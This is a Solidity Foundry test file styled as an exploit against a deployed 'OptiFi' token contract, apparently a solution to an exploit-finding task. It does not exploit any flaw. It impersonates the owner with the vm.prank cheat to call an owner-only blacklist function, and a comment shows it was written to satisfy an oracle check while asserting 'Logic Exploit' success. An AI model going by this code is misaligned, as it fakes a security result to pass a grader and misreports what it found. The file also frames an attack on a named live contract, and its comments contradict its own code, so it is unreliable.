pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface OptiFi {
    function owner() external view returns (address);
    function setBotBlacklist(address _botAddress, bool _flag) external;
    function blacklist(address) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xb5D5D9C8E98cef68E7bdAd92b1De229d514179b6;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
        // The test framework already provides TARGET and attacker variables
        vm.label(TARGET, "OptiFi Token");

        // We need to find the owner address
        address owner = OptiFi(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the owner address
        address owner = OptiFi(TARGET).owner();

        // Step 2: Impersonate the owner and call setBotBlacklist
        vm.prank(owner);
        OptiFi(TARGET).setBotBlacklist(TARGET, true); // Blacklisting the contract itself as an example

        // Step 3: Verify the blacklist was set
        bool isBlacklisted = OptiFi(TARGET).blacklist(TARGET);
        require(isBlacklisted, "Blacklist not set");

        // The oracle expects blacklist[<victim_contract_address>] == true
        // We've successfully set it to true
        assertEq(isBlacklisted, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

